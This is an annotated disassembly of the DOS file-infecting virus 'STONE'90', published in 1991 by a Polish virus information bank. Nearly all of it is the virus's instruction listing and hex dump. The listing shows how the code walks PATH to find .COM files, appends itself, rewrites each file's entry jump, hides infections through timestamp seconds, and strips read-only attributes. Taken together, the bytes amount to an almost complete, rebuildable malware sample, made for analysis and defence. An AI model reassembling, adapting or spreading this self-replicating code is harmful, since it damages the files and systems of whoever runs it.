;===============================================
;  Virus STONE'90
;
; disassembled by Andrzej Kadlof august 1991
;
; (C) Polish Section Of Virus Information Bank
;===============================================

; virus entry point

0615 EB01           JMP     0618        ; what for ?
0617 90             NOP

0618 51             PUSH    CX
0619 BA0F09         MOV     DX,090F     ; base of virus working area
               ;               ^^^^  word modified by virus
061C 8BF2           MOV     SI,DX
061E 8B6C21         MOV     BP,[SI+21]  ; length of carrier with virus
0621 56             PUSH    SI

; safe first three bytes of mather program, place will be used as the buffer

0622 FC             CLD
0623 B90300         MOV     CX,0003
0626 8BFE           MOV     DI,SI
0628 83C723         ADD     DI,+23
062B BE0001         MOV     SI,0100
062E F3A4           REPZ    MOVSB

0630 5E             POP     SI          ; restore base of working area
0631 56             PUSH    SI

0632 FC             CLD
0633 B90300         MOV     CX,0003
0636 8BFE           MOV     DI,SI
0638 81C7B400       ADD     DI,00B4
063C 83C60A         ADD     SI,+0A
063F F3A4           REPZ    MOVSB
0641 5E             POP     SI

; get and store address of current DTA

0642 06             PUSH    ES
0643 B42F           MOV     AH,2F       ; get DTA
0645 CD21           INT     21
0647 891C           MOV     [SI],BX
0649 8C4402         MOV     [SI+02],ES
064C 07             POP     ES

; set new DTA

064D BA4E00         MOV     DX,004E
0650 03D6           ADD     DX,SI
0652 B41A           MOV     AH,1A       ; set DTA
0654 CD21           INT     21

0656 06             PUSH    ES
0657 56             PUSH    SI

; get segment of environment

0658 53             PUSH    BX
0659 BB2C00         MOV     BX,002C
065C 8B07           MOV     AX,[BX]
065E 5B             POP     BX
065F 8EC0           MOV     ES,AX

; scan environment, look for string 'PATH='

0661 BF0000         MOV     DI,0000     ; start of buffer

0664 5E             POP     SI          ; restore offset of working area
0665 56             PUSH    SI
0666 83C61A         ADD     SI,+1A      ; 'PATH='
0669 AC             LODSB
066A B90080         MOV     CX,8000     ; maximum size
066D F2AE           REPNZ   SCASB       ; search for 'P'
066F B90400         MOV     CX,0004     ; length of rest of string
0672 AC             LODSB
0673 AE             SCASB
0674 75EE           JNZ     0664        ; try again

0676 E2FA           LOOP    0672        ; check next character

; restore SI and ES

0678 5E             POP     SI
0679 07             POP     ES

; store address of found path

067A 897C16         MOV     [SI+16],DI
067D 8BDE           MOV     BX,SI
067F 83C626         ADD     SI,+26
0682 8BFE           MOV     DI,SI
0684 EB46           JMP     06CC        ; search for victim
0686 90             NOP

0687 837C1600       CMP     WORD PTR [SI+16],+00  ; 
068B 7503           JNZ     0690

068D E96101         JMP     07F1        ; exit to application

; consider next path

0690 1E             PUSH    DS
0691 56             PUSH    SI
0692 50             PUSH    AX
0693 06             PUSH    ES
0694 06             PUSH    ES
0695 1F             POP     DS
0696 53             PUSH    BX
0697 BB2C00         MOV     BX,002C
069A 8B07           MOV     AX,[BX]
069C 5B             POP     BX
069D 89441F         MOV     [SI+1F],AX
06A0 8BFE           MOV     DI,SI
06A2 8B4516         MOV     AX,[DI+16]
06A5 8BF0           MOV     SI,AX
06A7 8E5D1F         MOV     DS,[DI+1F]
06AA 07             POP     ES
06AB 58             POP     AX
06AC 83C726         ADD     DI,+26

; copy path to local buffer

06AF AC             LODSB
06B0 3C3B           CMP     AL,3B       ; ';' end of path
06B2 740A           JZ      06BE

06B4 3C00           CMP     AL,00       ; end of environment
06B6 7403           JZ      06BB

06B8 AA             STOSB
06B9 EBF4           JMP     06AF        ; get next character

06BB BE0000         MOV     SI,0000

06BE 5B             POP     BX
06BF 1F             POP     DS

06C0 897716         MOV     [BX+16],SI
06C3 807DFF5C       CMP     BYTE PTR [DI-01],5C  ; '\' directory sign
06C7 7403           JZ      06CC

06C9 B05C           MOV     AL,5C       ; add '\'
06CB AA             STOSB

06CC 897F18         MOV     [BX+18],DI  ; first byte after path
06CF 8BF3           MOV     SI,BX
06D1 83C610         ADD     SI,+10      ; '*.COM', 0
06D4 B90600         MOV     CX,0006
06D7 F3A4           REPZ    MOVSB       ; form full path for search

06D9 8BF3           MOV     SI,BX
06DB B44E           MOV     AH,4E       ; Find First
06DD BA2600         MOV     DX,0026
06E0 03D6           ADD     DX,SI
06E2 B90300         MOV     CX,0003     ; read only and hidden
06E5 CD21           INT     21

06E7 EB05           JMP     06EE
06E9 90             NOP

06EA B44F           MOV     AH,4F       ; Find next
06EC CD21           INT     21

06EE 7302           JAE     06F2

06F0 EB95           JMP     0687

06F2 8B4464         MOV     AX,[SI+64]  ; get file time
06F5 241F           AND     AL,1F       ; extract seconds
06F7 3C07           CMP     AL,07
06F9 74EF           JZ      06EA        ; infected, find next

06FB 817C6800FA     CMP     WORD PTR [SI+68],FA00  ; maximum file size
0700 77E8           JA      06EA        ; file too long, find next

0702 837C680A       CMP     WORD PTR [SI+68],+0A    ; minimum file size
0706 72E2           JB      06EA        ; file too short, find next

0708 8B7C18         MOV     DI,[SI+18]
070B 56             PUSH    SI
070C 83C66C         ADD     SI,+6C
070F AC             LODSB
0710 AA             STOSB
0711 3C00           CMP     AL,00
0713 75FA           JNZ     070F

0715 5E             POP     SI
0716 8B4C63         MOV     CX,[SI+63]
0719 B500           MOV     CH,00
071B 894C08         MOV     [SI+08],CX  ; store file attributes
071E 8BC1           MOV     AX,CX
0720 B9FEFF         MOV     CX,FFFE     ; clear read only
0723 23C1           AND     AX,CX
0725 8BC8           MOV     CX,AX
0727 B80143         MOV     AX,4301     ; set file attributes
072A BA2600         MOV     DX,0026
072D 03D6           ADD     DX,SI
072F CD21           INT     21

0731 B8023D         MOV     AX,3D02     ; open file for read/write
0734 CD21           INT     21

0736 7303           JAE     073B

0738 E9A900         JMP     07E4

073B 8BD8           MOV     BX,AX       ; handle

; store and modify file time/date stamp

073D 8B4C66         MOV     CX,[SI+66]
0740 894C06         MOV     [SI+06],CX
0743 8B4C64         MOV     CX,[SI+64]
0746 80E1E0         AND     CL,E0       ; set seconds to 14
0749 80C907         OR      CL,07
074C 894C04         MOV     [SI+04],CX
074F B80242         MOV     AX,4202     ; move file ptr to EOF
0752 B90000         MOV     CX,0000
0755 BA0000         MOV     DX,0000
0758 CD21           INT     21

075A 05C103         ADD     AX,03C1     ; virus length
075D 894421         MOV     [SI+21],AX  ; new file length
0760 B80042         MOV     AX,4200     ; move file ptr to BOF
0763 33D2           XOR     DX,DX
0765 33C9           XOR     CX,CX
0767 CD21           INT     21

0769 B43F           MOV     AH,3F       ; read file
076B B90300         MOV     CX,0003     ; read first three bytes
076E BA0A00         MOV     DX,000A     ; to buffer
0771 03D6           ADD     DX,SI
0773 CD21           INT     21

0775 725E           JB      07D5

0777 3C03           CMP     AL,03
0779 755A           JNZ     07D5

077B B80242         MOV     AX,4202     ; move file ptr to EOF
077E 33D2           XOR     DX,DX
0780 33C9           XOR     CX,CX
0782 CD21           INT     21

; form new start bytes for victim

0784 8BC8           MOV     CX,AX       ; file length
0786 2D0300         SUB     AX,0003     ; length of JMP xxxx
0789 89440E         MOV     [SI+0E],AX  ; output buffer
078C 81C1FA03       ADD     CX,03FA
0790 8BFE           MOV     DI,SI
0792 81EFF502       SUB     DI,02F5
0796 8B05           MOV     AX,[DI]
0798 8984B200       MOV     [SI+00B2],AX
079C 890D           MOV     [DI],CX
079E B440           MOV     AH,40       ; write file
07A0 B9C103         MOV     CX,03C1     ; virus length
07A3 8BD6           MOV     DX,SI
07A5 81EAFA02       SUB     DX,02FA     ; start of virus code
07A9 CD21           INT     21

07AB 7228           JB      07D5

07AD 3DC103         CMP     AX,03C1     ; check for error
07B0 7523           JNZ     07D5        ; error

07B2 B80042         MOV     AX,4200     ; move file ptr to BOF
07B5 B90000         MOV     CX,0000
07B8 BA0000         MOV     DX,0000
07BB CD21           INT     21

; modify first bytes of victim

07BD 8BFE           MOV     DI,SI
07BF 81EFF502       SUB     DI,02F5
07C3 8B84B200       MOV     AX,[SI+00B2]
07C7 8905           MOV     [DI],AX
07C9 B440           MOV     AH,40       ; write file
07CB B90300         MOV     CX,0003
07CE 8BD6           MOV     DX,SI
07D0 83C20D         ADD     DX,+0D
07D3 CD21           INT     21

; restore file time/date stamp

07D5 8B5406         MOV     DX,[SI+06]
07D8 8B4C04         MOV     CX,[SI+04]
07DB B80157         MOV     AX,5701
07DE CD21           INT     21

; close file

07E0 B43E           MOV     AH,3E       ; close file
07E2 CD21           INT     21

; restore file attributes

07E4 B80143         MOV     AX,4301
07E7 8B4C08         MOV     CX,[SI+08]
07EA BA2600         MOV     DX,0026
07ED 03D6           ADD     DX,SI
07EF CD21           INT     21

; restore DTA

07F1 1E             PUSH    DS
07F2 B41A           MOV     AH,1A
07F4 8B14           MOV     DX,[SI]
07F6 8E5C02         MOV     DS,[SI+02]
07F9 CD21           INT     21

; restore first three bytes of mather program

07FB 1F             POP     DS
07FC 896C21         MOV     [SI+21],BP
07FF 56             PUSH    SI
0800 FC             CLD
0801 B90300         MOV     CX,0003
0804 BF0001         MOV     DI,0100
0807 83C623         ADD     SI,+23
080A F3A4           REPZ    MOVSB

080C 5E             POP     SI
080D 56             PUSH    SI
080E FC             CLD
080F B90300         MOV     CX,0003
0812 8BFE           MOV     DI,SI
0814 83C70A         ADD     DI,+0A
0817 81C6B400       ADD     SI,00B4
081B F3A4           REPZ    MOVSB

081D 5E             POP     SI
081E BB2C00         MOV     BX,002C
0821 8B07           MOV     AX,[BX]
0823 89447B         MOV     [SI+7B],AX
0826 8ED8           MOV     DS,AX
0828 8EC0           MOV     ES,AX
082A 33FF           XOR     DI,DI
082C B001           MOV     AL,01
082E B9E803         MOV     CX,03E8
0831 FC             CLD
0832 F2AE           REPNZ   SCASB

0834 47             INC     DI
0835 8BD7           MOV     DX,DI
0837 2E895479       MOV     CS:[SI+79],DX
083B B8003D         MOV     AX,3D00     ; open file for read only
083E CD21           INT     21

0840 7303           JAE     0845

0842 E9AA00         JMP     08EF

; get file time/date stamp

0845 8BD8           MOV     BX,AX
0847 0E             PUSH    CS
0848 1F             POP     DS
0849 1E             PUSH    DS
084A 07             POP     ES
084B B80057         MOV     AX,5700
084E CD21           INT     21           ; DOS
0850 895406         MOV     [SI+06],DX
0853 894C04         MOV     [SI+04],CX

; get file length

0856 B80242         MOV     AX,4202
0859 33C9           XOR     CX,CX
085B 33D2           XOR     DX,DX
085D CD21           INT     21

085F 50             PUSH    AX
0860 B43E           MOV     AH,3E       ; close file
0862 CD21           INT     21

0864 58             POP     AX
0865 3BC5           CMP     AX,BP       ; own length
0867 7503           JNZ     086C        ; length is changed

0869 E98300         JMP     08EF        ; exit to application

; file changed length, probably it is efect of infection of same other virus
; inform user and cure the carrier program

086C 8BD6           MOV     DX,SI
086E 83C27D         ADD     DX,+7D      ; 'Sorry, I'm INFECTED! ',$
0871 B409           MOV     AH,09       ; write string
0873 CD21           INT     21

; write file name 

0875 C55479         LDS     DX,[SI+79]  ;
0878 8BFA           MOV     DI,DX
087A 1E             PUSH    DS
087B 07             POP     ES
087C B9C800         MOV     CX,00C8
087F 33C0           XOR     AX,AX
0881 F2AE           REPNZ   SCASB

0883 4F             DEC     DI
0884 C60524         MOV     BYTE PTR [DI],24 ; add final '$'
0887 B409           MOV     AH,09       ; write string
0889 CD21           INT     21

; cure file

088B C60500         MOV     BYTE PTR [DI],00
088E B80043         MOV     AX,4300
0891 CD21           INT     21          ; get file attributes

0893 725A           JB      08EF

0895 2E894C08       MOV     CS:[SI+08],CX
0899 80F120         XOR     CL,20       ; flip archive bit
089C F6C127         TEST    CL,27       ; hidden, system, read only
089F 7409           JZ      08AA

08A1 33C9           XOR     CX,CX       ; clear all attributes
08A3 B80143         MOV     AX,4301     ; set file attributes
08A6 CD21           INT     21

08A8 7245           JB      08EF

08AA B441           MOV     AH,41       ; delete file
08AC CD21           INT     21

08AE 723F           JB      08EF

08B0 B43C           MOV     AH,3C       ; create file
08B2 B92000         MOV     CX,0020     ; with archive bit set
08B5 CD21           INT     21

08B7 7236           JB      08EF

08B9 8BD8           MOV     BX,AX
08BB 0E             PUSH    CS
08BC 1F             POP     DS
08BD 1E             PUSH    DS
08BE 07             POP     ES
08BF B440           MOV     AH,40       ; write file
08C1 8BCD           MOV     CX,BP
08C3 BA0001         MOV     DX,0100
08C6 CD21           INT     21

08C8 7225           JB      08EF

08CA 3BC1           CMP     AX,CX       ; check for error
08CC 7521           JNZ     08EF

08CE B80157         MOV     AX,5701     ; restore file time/date stamp
08D1 8B5406         MOV     DX,[SI+06]
08D4 8B4C04         MOV     CX,[SI+04]
08D7 CD21           INT     21

08D9 B43E           MOV     AH,3E       ; close file
08DB CD21           INT     21

08DD B80143         MOV     AX,4301     ; restore attributes
08E0 8B4C08         MOV     CX,[SI+08]
08E3 CD21           INT     21

08E5 B409           MOV     AH,09       ; write string
08E7 8BD6           MOV     DX,SI
08E9 81C29400       ADD     DX,0094     ; "I'm already NOT infected!', CR, LF, $
08ED CD21           INT     21

08EF 56             PUSH    SI
08F0 FC             CLD
08F1 83C60A         ADD     SI,+0A
08F4 BF0001         MOV     DI,0100
08F7 B90300         MOV     CX,0003
08FA F3A4           REPZ    MOVSB

08FC 5E             POP     SI
08FD 59             POP     CX
08FE 33C0           XOR     AX,AX
0900 33DB           XOR     BX,BX
0902 33D2           XOR     DX,DX
0904 33F6           XOR     SI,SI
0906 BF0001         MOV     DI,0100     ; return address
0909 57             PUSH    DI
090A 33FF           XOR     DI,DI
090C C2FFFF         RET     FFFF        ; jump to application

; virus workinga area

090F 80 00 69 14          ; pointer to current DTA
0913 07           ADC     AL,07
0914 004112         ADD     [BX+DI+12],AL
0917 2000           AND     [BX+SI],AL
0919 E89104         CALL    0DAD
091C E91205         JMP     0E31

091F 2A2E434F       SUB     CH,[4F43]
0923 4D             DEC     BP
0924 001C           ADD     [SI],BL
0926 003A           ADD     [BP+SI],BH
0928 095041         OR      [BX+SI+41],DX
092B 54             PUSH    SP
092C 48             DEC     AX
092D 3D0000         CMP     AX,0000
0930 D608               ; length of mather program
0932 E9           OR      CL,CH
0933 17             POP     SS
0934 054646         ADD     AX,4646
0937 46             INC     SI
0938 2E43        CS:INC     BX
093A 4F             DEC     DI
093B 4D             DEC     BP
093C 0000           ADD     [BX+SI],AL
093E 0000           ADD     [BX+SI],AL
0940 0000           ADD     [BX+SI],AL
0942 0000           ADD     [BX+SI],AL
0944 0000           ADD     [BX+SI],AL
0946 0000           ADD     [BX+SI],AL
0948 0000           ADD     [BX+SI],AL
094A 0000           ADD     [BX+SI],AL
094C 0000           ADD     [BX+SI],AL
094E 0000           ADD     [BX+SI],AL
0950 0000           ADD     [BX+SI],AL
0952 0000           ADD     [BX+SI],AL
0954 0000           ADD     [BX+SI],AL
0956 0000           ADD     [BX+SI],AL
0958 0000           ADD     [BX+SI],AL
095A 0000           ADD     [BX+SI],AL
095C 0003           ADD     [BP+DI],AL

; local DTA

095E 3F             AAS
095F 3F             AAS
0960 3F             AAS
0961 3F             AAS
0962 3F             AAS
0963 3F             AAS
0964 3F             AAS
0965 3F             AAS
0966 43             INC     BX
0967 4F             DEC     DI
0968 4D             DEC     BP
0969 0304           ADD     AX,[SI]
096B 0002           ADD     [BP+SI],AL
096D 050000         ADD     AX,0000
0970 0000           ADD     [BX+SI],AL
0972 2000           AND     [BX+SI],AL
0974 004112         ADD     [BX+DI+12],AL
0977 150500         ADC     AX,0005
097A 004646         ADD     [BP+46],AL
097D 46             INC     SI
097E 2E43        CS:INC     BX
0980 4F             DEC     DI
0981 4D             DEC     BP
0982 0000           ADD     [BX+SI],AL
0984 4F             DEC     DI
0985 4D             DEC     BP
0986 0000           ADD     [BX+SI],AL
0988 7200           JB      098A

098A A5             MOVSW
098B 0F07           LOADALL
098D 53             PUSH    BX
098E 6F             OUTSW
098F 7272           JB      0A03

0991 792C           JNS     09BF

0993 204960         AND     [BX+DI+60],CL
0996 6D             INSW
0997 20494E         AND     [BX+DI+4E],CL
099A 46             INC     SI
099B 45             INC     BP
099C 43             INC     BX
099D 54             PUSH    SP
099E 45             INC     BP
099F 44             INC     SP
09A0 2120           AND     [BX+SI],SP
09A2 2407           AND     AL,07
09A4 204960         AND     [BX+DI+60],CL
09A7 6D             INSW
09A8 20616C         AND     [BX+DI+6C],AH
09AB 7265           JB      0A12

09AD 61             POPA
09AE 647920      FS:JNS     09D1

09B1 4E             DEC     SI
09B2 4F             DEC     DI
09B3 54             PUSH    SP
09B4 20696E         AND     [BX+DI+6E],CH
09B7 6665637465     ARPL    GS:[SI+65],SI
09BC 64210D         AND     FS:[DI],CX
09BF 0A24           OR      AH,[SI]
09C1 1409           ADC     AL,09
09C3 E99502         JMP     0C5B

09C6 284329         SUB     [BP+DI+29],AL
09C9 205374         AND     [BP+DI+74],DL
09CC 6F             OUTSW
09CD 6E             OUTSB
09CE 6560        GS:PUSHA
09D0 3930           CMP     [BX+SI],SI
09D2 202E2E2E       AND     [2E2E],CH

0900  33 DB 33 D2 33 F6 BF 00-01 57 33 FF C2 FF FF 80 3[3R3v?..W3.B...
0910  00 69 14 07 00 41 12 20-00 E8 91 04 E9 12 05 2A .i...A. .h..i..*
0920  2E 43 4F 4D 00 1C 00 3A-09 50 41 54 48 3D 00 00 .COM...:.PATH=..
0930  D6 08 E9 17 05 46 46 46-2E 43 4F 4D 00 00 00 00 V.i..FFF.COM....
0940  * 0001 Lines Of 00 Skipped *
0950  00 00 00 00 00 00 00 00-00 00 00 00 00 03 3F 3F ..............??
0960  3F 3F 3F 3F 3F 3F 43 4F-4D 03 04 00 02 05 00 00 ??????COM.......
0970  00 00 20 00 00 41 12 15-05 00 00 46 46 46 2E 43 .. ..A.....FFF.C
0980  4F 4D 00 00 4F 4D 00 00-72 00 A5 0F 07 53 6F 72 OM..OM..r.%..Sor
0990  72 79 2C 20 49 60 6D 20-49 4E 46 45 43 54 45 44 ry, I`m INFECTED
09A0  21 20 24 07 20 49 60 6D-20 61 6C 72 65 61 64 79 ! $. I`m already
09B0  20 4E 4F 54 20 69 6E 66-65 63 74 65 64 21 0D 0A  NOT infected!..
09C0  24 14 09 E9 95 02 28 43-29 20 53 74 6F 6E 65 60 $..i..(C) Stone`
09D0  39 30 20 2E 2E 2E                               90 ...          
